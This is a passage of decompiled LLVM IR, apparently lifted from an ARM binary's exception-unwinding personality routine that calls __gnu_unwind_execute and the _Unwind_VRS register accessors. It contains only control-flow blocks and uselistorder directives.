dec_label_pc_18d90:                               ; preds = %dec_label_pc_18d8c
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  br i1 %v2_18d94, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_18d90
  %v0_18da8119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_18da8

bb155:                                            ; preds = %dec_label_pc_18d90
  %v2_18da0 = icmp eq i32 %v0_18f24, 0
  %v0_18da8 = load i32, i32* @r7, align 4
  br i1 %v2_18da0, label %dec_label_pc_18da8, label %dec_label_pc_19120

dec_label_pc_18da8:                               ; preds = %.thread, %bb155
  %v0_18da8120 = phi i32 [ %v0_18da8119, %.thread ], [ %v0_18da8, %bb155 ]
  %v1_18da8 = add i32 %v0_18da8120, 4
  %v1_18dac = inttoptr i32 %v1_18da8 to i32*
  %v2_18dac = load i32, i32* %v1_18dac, align 4
  %v2_18db0 = icmp eq i32 %v2_18dac, 0
  br i1 %v2_18db0, label %dec_label_pc_18db8, label %dec_label_pc_18d04

dec_label_pc_18db8:                               ; preds = %dec_label_pc_18fcc, %dec_label_pc_18f90, %dec_label_pc_18da8, %dec_label_pc_18cf8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_18cf8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18da8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f90 ], [ %stack_var_-76.4, %dec_label_pc_18fcc ]
  %v0_18db8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18db8, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_18dc0 = call i32 @__gnu_unwind_execute(i32 %v0_18db8, %anon_struct_13* %tmp156)
  store i32 %v4_18dc0, i32* %r0.global-to-local, align 4
  store i32 %v4_18dc0, i32* %r5.global-to-local, align 4
  %v2_18dc4 = icmp eq i32 %v4_18dc0, 0
  br i1 %v2_18dc4, label %dec_label_pc_18dcc, label %dec_label_pc_18e48

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18db8
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_18dd0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_18dd0, label %bb157, label %dec_label_pc_18ddc

bb157:                                            ; preds = %dec_label_pc_18dcc
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_18ddc:                               ; preds = %dec_label_pc_18dcc
  %v2_18ddc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_18ddc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18dec = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18dec, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_18df4 = call i32 @_Unwind_VRS_Get(i32 %v0_18dec, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_18df8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_18dec, i32* %r0.global-to-local, align 4
  %v5_18e0c = call i32 @_Unwind_VRS_Set(i32 %v0_18dec, i32 %v0_18df8, i32 14, i32 %v0_18df8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18e0c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* %r2.global-to-local, align 4
  %v4_18e18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 32) to i32*), align 4
  %v0_18e1c = load i32, i32* %r5.global-to-local, align 4
  %v0_18e20 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18e20, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_18e18, i32* %stack_var_-48, align 4
  %v5_18e34 = call i32 @_Unwind_VRS_Set(i32 %v0_18e20, i32 %v0_18e1c, i32 15, i32 %v0_18e1c, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_18e40:                               ; preds = %dec_label_pc_18d8c
  %v7_18e40 = icmp eq i32 %v4_18d80, 2
  br i1 %v7_18e40, label %dec_label_pc_18e58, label %dec_label_pc_18e48

dec_label_pc_18e48:                               ; preds = %dec_label_pc_18e40, %dec_label_pc_18f2c, %dec_label_pc_18db8, %dec_label_pc_19120
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_18e4c:                               ; preds = %bb157, %dec_label_pc_19158, %dec_label_pc_190e8, %bb166, %dec_label_pc_18ddc, %dec_label_pc_18e48
  %v1_18e54 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19158 ], [ %v1_18e54.pre, %dec_label_pc_190e8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_18ddc ], [ 9, %dec_label_pc_18e48 ]
  store i32 %v3_18c68, i32* %r4.global-to-local, align 4
  store i32 %v6_18c68, i32* %r5.global-to-local, align 4
  ret i32 %v1_18e54

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e40
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  %v0_18e5c = load i32, i32* @r7, align 4
  %v1_18e5c = inttoptr i32 %v0_18e5c to i32*
  %v2_18e5c = load i32, i32* %v1_18e5c, align 4
  %tmp206 = bitcast i32 %v2_18e5c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_18e64 = bitcast float %tmp207 to i32
  store i32 %v1_18e64, i32* @sl, align 4
  br i1 %v2_18d94, label %dec_label_pc_18e6c, label %dec_label_pc_18fd8

dec_label_pc_18e6c:                               ; preds = %dec_label_pc_18e58
  %v2_18e6c = icmp eq i32 %v0_18f24, 0
  br i1 %v2_18e6c, label %dec_label_pc_18fc0, label %dec_label_pc_18e74

dec_label_pc_18e74:                               ; preds = %dec_label_pc_18e6c
  %v2_18e78 = icmp eq i32 %v1_18e64, 0
  br i1 %v2_18e78, label %dec_label_pc_18e84.thread, label %bb159

dec_label_pc_18e84.thread:                        ; preds = %dec_label_pc_18e74
  br label %dec_label_pc_190e8

bb159:                                            ; preds = %dec_label_pc_18e74
  br i1 %v3_18e7c, label %dec_label_pc_18e8c, label %dec_label_pc_18fc0

dec_label_pc_18e8c:                               ; preds = %bb159
  %v1_18e8c = add i32 %v0_18e5c, 4
  store i32 %v1_18e8c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_18e9c = load i32, i32* @r8, align 4
  %v1_18e9c = add i32 %v0_18e9c, 88
  store i32 %v1_18e9c, i32* %sb.global-to-local, align 4
  store i32 %v1_18e8c, i32* @r4, align 4
  br label %dec_label_pc_18ec0

dec_label_pc_18eb0:                               ; preds = %bb161
  %v1_18eb0 = add i32 %v0_18eb0, 1
  store i32 %v1_18eb0, i32* @r5, align 4
  %v1_18eb4 = load i32, i32* @sl, align 4
  %v9_18eb4 = icmp eq i32 %v1_18eb0, %v1_18eb4
  %v0_18eb8 = load i32, i32* @r4, align 4
  %v1_18eb8 = add i32 %v0_18eb8, 4
  store i32 %v1_18eb8, i32* @r4, align 4
  br i1 %v9_18eb4, label %dec_label_pc_190e8, label %dec_label_pc_18eb0.dec_label_pc_18ec0_crit_edge

dec_label_pc_18eb0.dec_label_pc_18ec0_crit_edge:  ; preds = %dec_label_pc_18eb0
  %v0_18ecc.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_18ec0

dec_label_pc_18ec0:                               ; preds = %dec_label_pc_18eb0.dec_label_pc_18ec0_crit_edge, %dec_label_pc_18e8c
  %v0_18ecc = phi i32 [ %v0_18ecc.pre, %dec_label_pc_18eb0.dec_label_pc_18ec0_crit_edge ], [ %v1_18e9c, %dec_label_pc_18e8c ]
  %v1_18ed0 = phi i32 [ %v1_18eb8, %dec_label_pc_18eb0.dec_label_pc_18ec0_crit_edge ], [ %v1_18e8c, %dec_label_pc_18e8c ]
  %v1_18ec0 = inttoptr i32 %v1_18ed0 to i32*
  %v2_18ec0 = load i32, i32* %v1_18ec0, align 4
  %v2_18ec4 = icmp eq i32 %v2_18ec0, 0
  store i32 %v0_18ecc, i32* %forced_unwind_-44, align 4
  br i1 %v2_18ec4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_18ec0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_18ec0, %bb160
  %v0_18ed4 = load i32, i32* @r8, align 4
  store i32 %v0_18ed4, i32* %r0.global-to-local, align 4
  store i32 %v2_18f60, i32* %r2.global-to-local, align 4
  %v4_18ee4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 100) to i32*), align 4
  store i32 102128, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18ee4)
  %v0_18ef0 = load i32, i32* %r0.global-to-local, align 4
  %v2_18ef0 = icmp eq i32 %v0_18ef0, 0
  %v0_18eb0 = load i32, i32* @r5, align 4
  br i1 %v2_18ef0, label %dec_label_pc_18eb0, label %dec_label_pc_18ef8

dec_label_pc_18ef8:                               ; preds = %bb161
  %v1_18ef8 = load i32, i32* @sl, align 4
  %v9_18ef8 = icmp eq i32 %v0_18eb0, %v1_18ef8
  br i1 %v9_18ef8, label %dec_label_pc_190e8, label %dec_label_pc_18f00

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18ef8
  %v0_18f00 = load i32, i32* @r7, align 4
  %v1_18f00 = inttoptr i32 %v0_18f00 to i32*
  %v2_18f00 = load i32, i32* %v1_18f00, align 4
  %v1_18f04 = icmp slt i32 %v2_18f00, 0
  %v0_18f0c.pre = load i32, i32* @r6, align 4
  br i1 %v1_18f04, label %dec_label_pc_18f0c, label %dec_label_pc_18fcc

dec_label_pc_18f0c:                               ; preds = %dec_label_pc_18f00, %dec_label_pc_18fc4
  %v0_18f0c = phi i32 [ %storemerge, %dec_label_pc_18fc4 ], [ %v0_18f0c.pre, %dec_label_pc_18f00 ]
  store i32 %v0_18f0c, i32* %r0.global-to-local, align 4
  %v1_18f10 = add i32 %v0_18f0c, 4
  store i32 %v1_18f10, i32* @r6, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_18f18:                               ; preds = %bb154
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  br i1 %v2_18d94, label %dec_label_pc_18f24, label %dec_label_pc_19010

dec_label_pc_18f24:                               ; preds = %dec_label_pc_18f18
  %v2_18f24 = icmp eq i32 %v0_18f24, 0
  br i1 %v2_18f24, label %dec_label_pc_18f90, label %dec_label_pc_18f2c

dec_label_pc_18f2c:                               ; preds = %dec_label_pc_18f24
  %v0_18f2c = load i32, i32* @r7, align 4
  %v1_18f2c = add i32 %v0_18f2c, 4
  %v2_18f2c = inttoptr i32 %v1_18f2c to i32*
  %v3_18f2c = load i32, i32* %v2_18f2c, align 4
  %v7_18f30 = icmp eq i32 %v3_18f2c, -2
  store i32 %v1_18f2c, i32* %r2.global-to-local, align 4
  br i1 %v7_18f30, label %dec_label_pc_18e48, label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %dec_label_pc_18f2c
  %v0_18f3c = load i32, i32* @r8, align 4
  %v1_18f3c = add i32 %v0_18f3c, 88
  %v7_18f40 = icmp eq i32 %v3_18f2c, -1
  store i32 %v1_18f3c, i32* %forced_unwind_-44, align 4
  br i1 %v7_18f40, label %dec_label_pc_18f84, label %dec_label_pc_18f4c

dec_label_pc_18f4c:                               ; preds = %dec_label_pc_18f3c
  %v2_18f50 = icmp eq i32 %v3_18f2c, 0
  br i1 %v2_18f50, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_18f4c
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_18f4c, %bb162
  store i32 %v0_18f3c, i32* %r0.global-to-local, align 4
  store i32 %v2_18f60, i32* %r2.global-to-local, align 4
  %v4_18f6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 100) to i32*), align 4
  store i32 102264, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18f6c)
  %v0_18f78 = load i32, i32* %r0.global-to-local, align 4
  %v2_18f78 = icmp eq i32 %v0_18f78, 0
  br i1 %v2_18f78, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_18f84.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18f84

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_18f90

dec_label_pc_18f84:                               ; preds = %.thread25, %dec_label_pc_18f3c
  %v3_18f84 = phi i32 [ %v3_18f84.pr, %.thread25 ], [ %v1_18f3c, %dec_label_pc_18f3c ]
  %v2_18f88 = icmp eq i32 %v3_18f84, 0
  br i1 %v2_18f88, label %dec_label_pc_18f90, label %dec_label_pc_190e8

dec_label_pc_18f90:                               ; preds = %bb164, %dec_label_pc_1903c, %dec_label_pc_19010, %dec_label_pc_18f84, %dec_label_pc_18f24
  %v0_18f90 = load i32, i32* @r7, align 4
  %v1_18f90 = add i32 %v0_18f90, 8
  %v1_18cf8 = inttoptr i32 %v1_18f90 to i32*
  %v2_18cf8 = load i32, i32* %v1_18cf8, align 4
  %v2_18cfc = icmp eq i32 %v2_18cf8, 0
  br i1 %v2_18cfc, label %dec_label_pc_18db8, label %dec_label_pc_18d04.preheader

dec_label_pc_18f98:                               ; preds = %entry
  %v3_18f98 = udiv i32 %v2_18c8c, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_18fa8 = mul nuw nsw i32 %v3_18f98, 4
  %v3_18fac = mul i32 %v2_18c8c, 65536
  %v2_18fb0 = add i32 %v6_18fa8, %v4_18c8c
  store i32 %v3_18fac, i32* %v4_18cac, align 8
  br label %dec_label_pc_18cd4

dec_label_pc_18fc0:                               ; preds = %bb159, %dec_label_pc_18e6c
  %v1_18fc0 = add i32 %v0_18e5c, 4
  br label %dec_label_pc_18fc4

dec_label_pc_18fc4:                               ; preds = %dec_label_pc_19004, %dec_label_pc_18fc0
  %v0_18fc4 = phi i32 [ %v2_19004, %dec_label_pc_19004 ], [ %v2_18e5c, %dec_label_pc_18fc0 ]
  %storemerge = phi i32 [ %v4_19004, %dec_label_pc_19004 ], [ %v1_18fc0, %dec_label_pc_18fc0 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_18fc4 = icmp slt i32 %v0_18fc4, 0
  br i1 %v1_18fc4, label %dec_label_pc_18f0c, label %dec_label_pc_18fcc

dec_label_pc_18fcc:                               ; preds = %dec_label_pc_18f00, %dec_label_pc_18fc4, %dec_label_pc_190d8, %dec_label_pc_18f0c
  %v0_18fd0 = phi i32 [ %v1_18f10, %dec_label_pc_18f0c ], [ %storemerge, %dec_label_pc_18fc4 ], [ %v1_190dc, %dec_label_pc_190d8 ], [ %v0_18f0c.pre, %dec_label_pc_18f00 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_18f0c ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18fc4 ], [ %v1_190d8, %dec_label_pc_190d8 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_18f00 ]
  %v0_18fcc = load i32, i32* @sl, align 4
  %v3_18fcc = mul i32 %v0_18fcc, 4
  %v2_18fd0 = add i32 %v3_18fcc, %v0_18fd0
  %v1_18cf865 = inttoptr i32 %v2_18fd0 to i32*
  %v2_18cf866 = load i32, i32* %v1_18cf865, align 4
  %v2_18cfc68 = icmp eq i32 %v2_18cf866, 0
  br i1 %v2_18cfc68, label %dec_label_pc_18db8, label %dec_label_pc_18d04.preheader.lr.ph

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18e58
  %v0_18fe8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18fe8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_18ff0 = load i32, i32* @r8, align 4
  %v1_18ff0 = add i32 %v0_18ff0, 32
  %v2_18ff0 = inttoptr i32 %v1_18ff0 to i32*
  %v3_18ff0 = load i32, i32* %v2_18ff0, align 4
  store i32 %v3_18ff0, i32* @r4, align 4
  %v5_18ff4 = call i32 @_Unwind_VRS_Get(i32 %v0_18fe8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18ff4, i32* %r0.global-to-local, align 4
  %v3_18ff8 = load i32, i32* %stack_var_-48, align 4
  %v0_18ffc = load i32, i32* @r4, align 4
  %v9_18ffc = icmp eq i32 %v0_18ffc, %v3_18ff8
  br i1 %v9_18ffc, label %dec_label_pc_190a4, label %dec_label_pc_18fd8.dec_label_pc_19004_crit_edge

dec_label_pc_18fd8.dec_label_pc_19004_crit_edge:  ; preds = %dec_label_pc_18fd8
  %v0_19004.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_19004

dec_label_pc_19004:                               ; preds = %dec_label_pc_18fd8.dec_label_pc_19004_crit_edge, %dec_label_pc_190a4
  %v0_19004 = phi i32 [ %v0_19004.pre, %dec_label_pc_18fd8.dec_label_pc_19004_crit_edge ], [ %v1_190a8, %dec_label_pc_190a4 ]
  %v1_19004 = inttoptr i32 %v0_19004 to i32*
  %v2_19004 = load i32, i32* %v1_19004, align 4
  %v4_19004 = add i32 %v0_19004, 4
  store i32 %v4_19004, i32* @r7, align 4
  br label %dec_label_pc_18fc4

dec_label_pc_19010:                               ; preds = %dec_label_pc_18f18
  %v0_19020 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19020, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_19028 = load i32, i32* @r8, align 4
  %v1_19028 = add i32 %v0_19028, 32
  %v2_19028 = inttoptr i32 %v1_19028 to i32*
  %v3_19028 = load i32, i32* %v2_19028, align 4
  store i32 %v3_19028, i32* @r4, align 4
  %v5_1902c = call i32 @_Unwind_VRS_Get(i32 %v0_19020, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1902c, i32* %r0.global-to-local, align 4
  %v3_19030 = load i32, i32* %stack_var_-48, align 4
  %v0_19034 = load i32, i32* @r4, align 4
  %v9_19034 = icmp eq i32 %v0_19034, %v3_19030
  br i1 %v9_19034, label %dec_label_pc_1903c, label %dec_label_pc_18f90

dec_label_pc_1903c:                               ; preds = %dec_label_pc_19010
  %v0_1903c = load i32, i32* @r8, align 4
  %v1_1903c = add i32 %v0_1903c, 40
  %v2_1903c = inttoptr i32 %v1_1903c to i32*
  %v3_1903c = load i32, i32* %v2_1903c, align 4
  %v1_19040 = load i32, i32* @r7, align 4
  %v9_19040 = icmp eq i32 %v3_1903c, %v1_19040
  br i1 %v9_19040, label %dec_label_pc_19048, label %dec_label_pc_18f90

dec_label_pc_19048:                               ; preds = %dec_label_pc_1903c
  %v1_19048 = inttoptr i32 %v3_1903c to i32*
  %v2_19048 = load i32, i32* %v1_19048, align 4
  %v1_1904c = and i32 %v2_19048, 1073741824
  %v2_1904c = icmp eq i32 %v1_1904c, 0
  br i1 %v2_1904c, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_19048
  %v2_19050 = or i32 %v2_19048, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_19048
  %tmp208 = bitcast i32 %v2_19048 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_19054 = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_19058 = phi i32 [ %v2_19188, %.thread28 ], [ %v2_19188, %bb169 ], [ %v3_1903c, %bb165 ], [ %v3_1903c, %.thread26 ]
  %v0_19058 = phi i32 [ %v2_19198, %.thread28 ], [ %v2_19194, %bb169 ], [ %v2_19050, %bb165 ], [ %v2_19054, %.thread26 ]
  %v2_19058 = add i32 %v0_19058, %v1_19058
  store i32 %v2_19058, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19070 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19070, i32* %r0.global-to-local, align 4
  %v5_19078 = call i32 @_Unwind_VRS_Set(i32 %v0_19070, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_19070, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_19090 = load i32, i32* @r8, align 4
  store i32 %v0_19090, i32* %stack_var_-48, align 4
  %v5_19098 = call i32 @_Unwind_VRS_Set(i32 %v0_19070, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_190a4:                               ; preds = %dec_label_pc_18fd8
  %v0_190a4 = load i32, i32* @r8, align 4
  %v1_190a4 = add i32 %v0_190a4, 40
  %v2_190a4 = inttoptr i32 %v1_190a4 to i32*
  %v3_190a4 = load i32, i32* %v2_190a4, align 4
  %v1_190a8 = load i32, i32* @r7, align 4
  %v9_190a8 = icmp eq i32 %v3_190a4, %v1_190a8
  br i1 %v9_190a8, label %dec_label_pc_190b0, label %dec_label_pc_19004

dec_label_pc_190b0:                               ; preds = %dec_label_pc_190a4
  %v1_190b4 = add i32 %v3_190a4, 4
  store i32 %v1_190b4, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_190bc = add i32 %v0_190a4, 44
  %v3_190bc = inttoptr i32 %v2_190bc to i32*
  store i32 0, i32* %v3_190bc, align 4
  %v0_190c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_190c0 = load i32, i32* @r8, align 4
  %v2_190c0 = add i32 %v1_190c0, 48
  %v3_190c0 = inttoptr i32 %v2_190c0 to i32*
  store i32 %v0_190c0, i32* %v3_190c0, align 4
  %v0_190c4 = load i32, i32* @sl, align 4
  %v1_190c4 = load i32, i32* @r8, align 4
  %v2_190c4 = add i32 %v1_190c4, 40
  %v3_190c4 = inttoptr i32 %v2_190c4 to i32*
  store i32 %v0_190c4, i32* %v3_190c4, align 4
  %v0_190c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_190c8 = load i32, i32* @r8, align 4
  %v2_190c8 = add i32 %v1_190c8, 52
  %v3_190c8 = inttoptr i32 %v2_190c8 to i32*
  store i32 %v0_190c8, i32* %v3_190c8, align 4
  %v0_190cc = load i32, i32* @r7, align 4
  %v1_190cc = inttoptr i32 %v0_190cc to i32*
  %v2_190cc = load i32, i32* %v1_190cc, align 4
  %v1_190d0 = icmp slt i32 %v2_190cc, 0
  br i1 %v1_190d0, label %dec_label_pc_190d8, label %dec_label_pc_19184

dec_label_pc_190d8:                               ; preds = %dec_label_pc_190b0
  %v0_190d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_190d8 = add i32 %v0_190d8, -3
  store i32 %v1_190d8, i32* %r2.global-to-local, align 4
  %v0_190dc = load i32, i32* %r0.global-to-local, align 4
  %v1_190dc = add i32 %v0_190dc, 4
  store i32 %v1_190dc, i32* @r6, align 4
  br label %dec_label_pc_18fcc

dec_label_pc_190e8:                               ; preds = %dec_label_pc_18ef8, %dec_label_pc_18f84, %dec_label_pc_18eb0, %dec_label_pc_18e84.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_190f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_190f8, i32* %r0.global-to-local, align 4
  %v5_19100 = call i32 @_Unwind_VRS_Get(i32 %v0_190f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19104 = load i32, i32* @r7, align 4
  %v1_19104 = load i32, i32* @r8, align 4
  %v2_19104 = add i32 %v1_19104, 40
  %v3_19104 = inttoptr i32 %v2_19104 to i32*
  store i32 %v0_19104, i32* %v3_19104, align 4
  %v3_19108 = load i32, i32* %stack_var_-48, align 4
  %v3_1910c = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_1910c, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_19114 = load i32, i32* @r8, align 4
  %v2_19114 = add i32 %v1_19114, 32
  %v3_19114 = inttoptr i32 %v2_19114 to i32*
  store i32 %v3_19108, i32* %v3_19114, align 4
  %v0_19118 = load i32, i32* %r2.global-to-local, align 4
  %v1_19118 = load i32, i32* @r8, align 4
  %v2_19118 = add i32 %v1_19118, 36
  %v3_19118 = inttoptr i32 %v2_19118 to i32*
  store i32 %v0_19118, i32* %v3_19118, align 4
  %v1_18e54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_19120:                               ; preds = %bb155
  %v1_19120 = inttoptr i32 %v0_18da8 to i32*
  %v2_19120 = load i32, i32* %v1_19120, align 4
  %v1_19124 = add i32 %v0_18da8, 4
  %v1_19128 = and i32 %v2_19120, 1073741824
  %v2_19128 = icmp eq i32 %v1_19128, 0
  %v2_1912c = or i32 %v2_19120, -2147483648
  %tmp210 = bitcast i32 %v2_19120 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_19130 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_19128, i32 %v2_19130, i32 %v2_1912c
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_19134 = load i32, i32* @r8, align 4
  %v2_19134 = add i32 %v1_19134, 56
  %v3_19134 = inttoptr i32 %v2_19134 to i32*
  store i32 %v1_19124, i32* %v3_19134, align 4
  %v0_19138 = load i32, i32* @r8, align 4
  store i32 %v0_19138, i32* %r0.global-to-local, align 4
  %v4_19144 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32 28) to i32*), align 4
  store i32 102736, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19144)
  %v0_19150 = load i32, i32* %r0.global-to-local, align 4
  %v2_19150 = icmp eq i32 %v0_19150, 0
  br i1 %v2_19150, label %dec_label_pc_18e48, label %dec_label_pc_19158

dec_label_pc_19158:                               ; preds = %dec_label_pc_19120
  %v0_19158 = load i32, i32* %r4.global-to-local, align 4
  %v1_19158 = load i32, i32* @r7, align 4
  %v2_19158 = add i32 %v1_19158, %v0_19158
  store i32 %v2_19158, i32* %stack_var_-48, align 4
  %v0_19168 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19168, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_19178 = call i32 @_Unwind_VRS_Set(i32 %v0_19168, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e4c

dec_label_pc_19184:                               ; preds = %dec_label_pc_190b0
  %v0_19184 = load i32, i32* @sl, align 4
  %v3_19184 = mul i32 %v0_19184, 4
  %v0_19188 = load i32, i32* %r0.global-to-local, align 4
  %v2_19188 = add i32 %v0_19188, %v3_19184
  %v3_19188 = inttoptr i32 %v2_19188 to i32*
  %v4_19188 = load i32, i32* %v3_19188, align 4
  %v1_1918c = and i32 %v4_19188, 1073741824
  %v2_1918c = icmp eq i32 %v1_1918c, 0
  br i1 %v2_1918c, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_19184
  %v2_19194 = or i32 %v4_19188, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_19184
  %tmp212 = bitcast i32 %v4_19188 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_19198 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_19188, { 2, 1, 0 }
  uselistorder i32 %v1_190dc, { 1, 0 }
  uselistorder i32 %v1_190d8, { 1, 0 }
  uselistorder i32 %v1_190a8, { 1, 0 }
  uselistorder i32 %v0_19070, { 1, 0, 2, 3 }
  uselistorder i32 %v3_1903c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_19004, { 1, 0 }
  uselistorder i32 %v0_19004, { 1, 0 }
  uselistorder i32 %v2_18cf866, { 1, 0 }
  uselistorder i32 %v2_18fd0, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_18cf8, { 1, 0 }
  uselistorder i32 %v1_18f90, { 1, 0 }
  uselistorder i32 %v3_18f2c, { 2, 0, 1 }
  uselistorder i32 %v0_18f0c, { 1, 0 }
  uselistorder i32 %v0_18f0c.pre, { 1, 0 }
  uselistorder i32 %v1_18e64, { 1, 0 }
  uselistorder i32 %v2_18e5c, { 1, 0 }
  uselistorder i32 %v0_18dec, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_18dac, { 1, 0 }
  uselistorder i32 %v1_18da8, { 1, 0 }
  uselistorder i32 %v0_18da8, { 1, 0, 2 }
  uselistorder i32 %v4_18d80, { 0, 2, 1, 3 }
  uselistorder i32 %v0_18f24, { 1, 2, 0 }
  uselistorder i32 %v0_18d58, { 1, 0 }
  uselistorder i32 %v3_18d54, { 1, 0, 2 }
  uselistorder i32 %v1_18d28, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_18f60, { 1, 0 }
  uselistorder i1 %v2_18d94, { 1, 0, 2 }
  uselistorder i32 %v1_18c98, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
